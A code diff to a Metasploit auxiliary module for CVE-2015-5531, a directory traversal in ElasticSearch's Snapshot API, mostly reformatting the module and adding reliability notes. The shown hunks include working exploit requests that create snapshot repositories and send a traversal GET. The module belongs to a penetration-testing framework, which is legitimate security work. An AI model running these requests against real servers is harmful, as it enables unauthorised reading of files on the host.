@@ -11,26 +11,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',
-      'Description'    => %q{
-        'This module exploits a directory traversal vulnerability in
-        ElasticSearch, allowing an attacker to read arbitrary files
-        with JVM process privileges, through the Snapshot API.'
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'ElasticSearch Snapshot API Directory Traversal',
+        'Description' => %q{
+          'This module exploits a directory traversal vulnerability in
+          ElasticSearch, allowing an attacker to read arbitrary files
+          with JVM process privileges, through the Snapshot API.'
+        },
+        'References' => [
           ['CVE', '2015-5531'],
           ['PACKETSTORM', '132721']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Benjamin Smith', # Vulnerability Discovery
           'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module
           'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -44,14 +50,14 @@ class MetasploitModule < Msf::Auxiliary
   def check_host(ip)
     res1 = send_request_raw(
       'method' => 'POST',
-      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
-      'data'   => '{"type":"fs","settings":{"location":"dsr"}}'
+      'uri' => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
+      'data' => '{"type":"fs","settings":{"location":"dsr"}}'
     )
 
     res2 = send_request_raw(
       'method' => 'POST',
-      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
-      'data'   => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
+      'uri' => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
+      'data' => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
     )
 
     if res1.body.include?('true') && res2.body.include?('true')
@@ -73,7 +79,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw(
       'method' => 'GET',
-      'uri'    => travs
+      'uri' => travs
     )
 
     if res && res.code == 400
